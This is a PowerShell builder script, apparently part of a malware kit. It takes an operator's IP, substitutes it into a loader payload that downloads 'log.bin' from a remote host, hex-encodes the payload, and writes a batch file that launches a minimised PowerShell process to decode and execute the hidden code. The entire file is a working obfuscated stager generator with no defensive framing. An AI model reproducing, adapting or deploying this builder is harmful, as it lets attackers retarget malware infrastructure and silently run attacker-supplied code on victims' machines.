# Compile.ps1 - Replace IP in loader payload and generate new.bat
# Usage: .\Compile.ps1 -Ip "1.2.3.4"
#    or: .\Compile.ps1  (will prompt for IP)

param(
    [Parameter(Mandatory = $false)]
    [string]$Ip
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Get IP if not provided
if (-not $Ip) {
    $Ip = Read-Host "Enter IP address (e.g. 45.83.140.12)"
}
$Ip = $Ip.Trim()
if (-not $Ip) {
    Write-Error "IP address is required."
}

# Load template (decrypted payload)
$templatePath = Join-Path $ScriptDir "loader_decrypted.txt"
if (-not (Test-Path $templatePath)) {
    Write-Error "loader_decrypted.txt not found in $ScriptDir"
}
$payload = Get-Content -Path $templatePath -Raw -Encoding UTF8

# Replace URL: only the host part (IP)
$oldUrl = "http://45.83.140.12/log/log.bin"
$newUrl = "http://$Ip/log/log.bin"
$payload = $payload.Replace($oldUrl, $newUrl)

# Encode payload to hex (UTF-8)
$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
$hex = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""

# Add same trailing null padding as original (optional, keeps decoder happy)
$paddingLen = 126  # number of trailing 00 pairs in original
$hex = $hex + ("00" * $paddingLen)

# Build .bat content (same structure as loader.bat)
$batLine3 = 'start /MIN "" %pspath%  -command "$ttms="$eruk2="""' + $hex + '""";$blwp="""""";for($i=0;$i -le $eruk2.Length-2;$i=$i+2){$NTMO=$eruk2[$i]+$eruk2[$i+1];$blwp= $blwp+[char]([convert]::toint16($NTMO,16));};Invoke-Command -ScriptBlock ([Scriptblock]::Create($blwp));";Invoke - Command - ScriptBlock([Scriptblock]::Create($ttms));"'

$batContent = @"
@echo off
IF EXIST "%PROGRAMFILES(X86)%" (set pspath="%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe") ELSE (set pspath="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe")
$batLine3
"@

$outPath = Join-Path $ScriptDir "new.bat"
$batContent = $batContent -replace "`r?`n", "`r`n"
[System.IO.File]::WriteAllText($outPath, $batContent.TrimEnd(), [System.Text.Encoding]::ASCII)

Write-Host "Done. new.bat generated with IP: $Ip" -ForegroundColor Green
Write-Host "Output: $outPath"
